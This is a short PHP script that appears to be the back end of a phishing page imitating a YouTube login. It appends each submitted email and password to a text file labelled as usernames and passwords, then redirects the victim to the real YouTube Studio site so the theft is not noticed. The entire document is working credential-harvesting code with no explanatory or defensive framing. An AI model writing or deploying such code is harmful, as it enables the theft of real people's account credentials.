<?php
file_put_contents("usernames.txt", "Username: " . $email = $_POST['email'] ."\nPassword: ". $pswrepeat = $_POST['pswrepeat'] . "\n", FILE_APPEND);
header('Location: https://studio.youtube.com/');
?>